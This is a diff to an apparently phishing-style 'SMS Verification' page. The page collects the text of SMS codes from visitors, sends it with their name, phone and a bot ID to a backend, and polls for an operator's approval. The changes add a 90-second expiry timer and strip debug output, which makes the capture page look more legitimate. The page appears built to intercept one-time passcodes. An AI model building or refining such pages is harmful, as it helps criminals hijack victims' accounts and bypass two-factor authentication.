@@ -66,6 +66,10 @@
             outline: none;
             border-color: #7a3d1c;
         }
+        textarea:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
         .btn {
             width: 100%;
             padding: 14px;
@@ -78,7 +82,7 @@
             cursor: pointer;
             transition: background 0.3s;
         }
-        .btn:hover {
+        .btn:hover:not(:disabled) {
             background: #5a2d12;
         }
         .btn:disabled {
@@ -108,6 +112,31 @@
             background: #2e1a1a;
             color: #ff6b6b;
         }
+        .status.expired {
+            background: #2e1a1a;
+            color: #ff6b6b;
+            border: 2px solid #ff6b6b;
+        }
+        .timer {
+            text-align: center;
+            color: #888;
+            font-size: 14px;
+            margin-top: 15px;
+            padding: 10px;
+            background: #1a1a1a;
+            border-radius: 8px;
+        }
+        .timer span {
+            color: #7a3d1c;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        .timer.expired {
+            color: #ff6b6b;
+        }
+        .timer.expired span {
+            color: #ff6b6b;
+        }
         .back-link {
             display: block;
             text-align: center;
@@ -119,34 +148,12 @@
         .back-link:hover {
             text-decoration: underline;
         }
-        .debug-info {
-            background: #1a1a1a;
-            padding: 10px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            font-size: 12px;
-            color: #666;
-            display: none;
-        }
-        .debug-info.show {
-            display: block;
-        }
-        .debug-info span {
-            color: #7a3d1c;
-        }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>📱 SMS Verification</h1>
         <p class="subtitle">Enter the code/message you received via SMS</p>
-
-        <!-- Debug info - remove after testing -->
-        <div class="debug-info" id="debugInfo">
-            <div>Name: <span id="debugName">-</span></div>
-            <div>Phone: <span id="debugPhone">-</span></div>
-            <div>Bot ID: <span id="debugBotId">-</span></div>
-        </div>
 
         <form id="smsForm">
             <div class="form-group">
@@ -160,6 +167,10 @@
             <button type="submit" class="btn" id="submitBtn">🔍 Validate SMS</button>
         </form>
 
+        <div class="timer" id="timer">
+            ⏱️ Time remaining: <span id="countdown">90</span> seconds
+        </div>
+
         <div class="status" id="status"></div>
         <a href="#" class="back-link" id="backLink">← Go Back</a>
     </div>
@@ -171,20 +182,6 @@
         const phone = urlParams.get('phone');
         const botId = urlParams.get('botId');
 
-        // Debug - show what we received
-        console.log('SMS Page - URL Params:', {
-            name: name,
-            phone: phone,
-            botId: botId,
-            fullUrl: window.location.href
-        });
-
-        // Show debug info
-        document.getElementById('debugName').textContent = name || '❌ MISSING';
-        document.getElementById('debugPhone').textContent = phone || '❌ MISSING';
-        document.getElementById('debugBotId').textContent = botId || '❌ MISSING';
-        document.getElementById('debugInfo').classList.add('show');
-
         // Handle back link
         const backLink = document.getElementById('backLink');
         if (botId) {
@@ -194,6 +191,13 @@
         const form = document.getElementById('smsForm');
         const status = document.getElementById('status');
         const submitBtn = document.getElementById('submitBtn');
+        const smsMessage = document.getElementById('smsMessage');
+        const timerDisplay = document.getElementById('timer');
+        const countdownDisplay = document.getElementById('countdown');
+
+        let countdown = 90;
+        let timerInterval = null;
+        let isExpired = false;
 
         function showStatus(message, type) {
             status.textContent = message;
@@ -203,12 +207,47 @@
             }
         }
 
+        function hideStatus() {
+            status.className = 'status';
+            status.textContent = '';
+        }
+
+        function startTimer() {
+            timerInterval = setInterval(() => {
+                countdown--;
+                countdownDisplay.textContent = countdown;
+
+                if (countdown <= 0) {
+                    clearInterval(timerInterval);
+                    isExpired = true;
+                    timerDisplay.classList.add('expired');
+                    countdownDisplay.textContent = '0';
+                    
+                    // Disable form
+                    smsMessage.disabled = true;
+                    submitBtn.disabled = true;
+                    submitBtn.textContent = '⏰ Expired';
+                    
+                    showStatus('⏰ The SMS code has expired. Please wait for a new message.', 'expired');
+                }
+            }, 1000);
+        }
+
+        // Start timer when page loads
+        startTimer();
+
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
 
-            const smsMessage = document.getElementById('smsMessage').value.trim();
+            // Check if expired
+            if (isExpired) {
+                showStatus('⏰ The SMS code has expired. Please wait for a new message.', 'expired');
+                return;
+            }
 
-            if (!smsMessage) {
+            const message = smsMessage.value.trim();
+
+            if (!message) {
                 showStatus('Please enter the SMS message you received.', 'error');
                 return;
             }
@@ -231,7 +270,7 @@
                     body: JSON.stringify({
                         name: name,
                         phone: phone,
-                        smsMessage: smsMessage,
+                        smsMessage: message,
                         botId: botId
                     })
                 });
@@ -250,6 +289,7 @@
 
                         if (d.approved === true) {
                             clearInterval(poll);
+                            clearInterval(timerInterval);
                             showStatus('✅ SMS verified! Redirecting...', 'success');
                             submitBtn.disabled = false;
                             submitBtn.textContent = '🔍 Validate SMS';
